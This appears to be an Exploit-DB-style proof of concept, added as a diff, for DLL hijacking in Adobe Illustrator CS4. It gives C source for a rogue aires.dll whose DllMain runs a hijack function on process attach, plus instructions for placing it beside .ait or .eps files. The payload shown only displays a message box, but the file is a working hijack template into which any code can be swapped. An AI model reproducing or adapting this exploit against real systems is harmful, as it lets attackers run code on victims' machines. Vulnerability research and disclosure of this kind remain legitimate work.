@@ -1,0 +1,34 @@
+/* 
+Exploit Title: Adobe Illustrator CS4 DLL Hijacking Exploit (aires.dll)
+Date: August 25, 2010
+Author: Glafkos Charalambous (glafkos[@]astalavista[dot]com)
+Version: CS4 v14.0.0
+Tested on: Windows 7 x64 Ultimate
+Vulnerable extensions: .ait .eps
+Greetz: Astalavista, OffSEC, Exploit-DB
+Note: Create folders system\enu_us and put aires.dll
+*/
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (
+            HANDLE    hinstDLL,
+            DWORD     fdwReason,
+            LPVOID    lpvReserved)
+{
+    switch (fdwReason)
+	{
+	case DLL_PROCESS_ATTACH:
+		dll_hijack();
+	case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+	break;
+	}
+	return TRUE;
+}
+
+int dll_hijack()
+{
+  MessageBox(0, "Adobe DLL Hijacking!", "DLL Message", MB_OK);
+}
